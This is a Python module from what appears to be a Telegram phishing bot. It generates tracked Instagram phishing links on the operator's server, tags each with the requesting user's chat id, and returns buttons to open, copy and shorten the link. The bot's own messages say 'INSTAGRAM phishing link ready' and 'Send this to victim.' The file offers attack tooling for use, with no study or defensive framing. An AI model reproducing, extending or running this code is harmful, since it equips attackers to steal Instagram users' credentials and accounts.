from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
from bot.config import BASE_URL
from bot.utils.storage import link_cache

# ==========================================
# INSTAGRAM: LINK GENERATE
# ==========================================

def generate_instagram_link(user_id):
    unique_id = str(uuid.uuid4())[:8]
    full_link = f"{BASE_URL}/p/ig/{unique_id}?v={user_id}"
    link_cache[unique_id] = {
        "user_id": user_id,
        "time": time.time(),
        "type": "instagram",
        "link": full_link
    }
    return full_link

# ==========================================
# INSTAGRAM: BUTTON HANDLER
# ==========================================

def handle_insta_button(bot, message, get_bottom_buttons):
    user_id = message.chat.id
    link = generate_instagram_link(user_id)
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 Open Link", url=link),
        InlineKeyboardButton("📋 Copy Link", callback_data="ig_copy"),
        InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
        InlineKeyboardButton("⬅ Back", callback_data="ig_back")
    )
    
    bot.send_message(
        user_id,
        f"✅ *INSTAGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ==========================================
# INSTAGRAM: INLINE CALLBACK HANDLERS
# ==========================================

def handle_insta_callback(bot, call):
    user_id = call.message.chat.id
    data = call.data
    
    if data == "ig_copy":
        bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
        return
    
    elif data == "ig_back":
        from bot.__init__ import start
        start(call.message)
        return
    
    elif data == "ig_menu":
        link = generate_instagram_link(user_id)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="ig_copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
            InlineKeyboardButton("⬅ Back", callback_data="ig_back")
        )
        bot.edit_message_text(
            f"✅ *INSTAGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
            chat_id=user_id,
            message_id=call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return
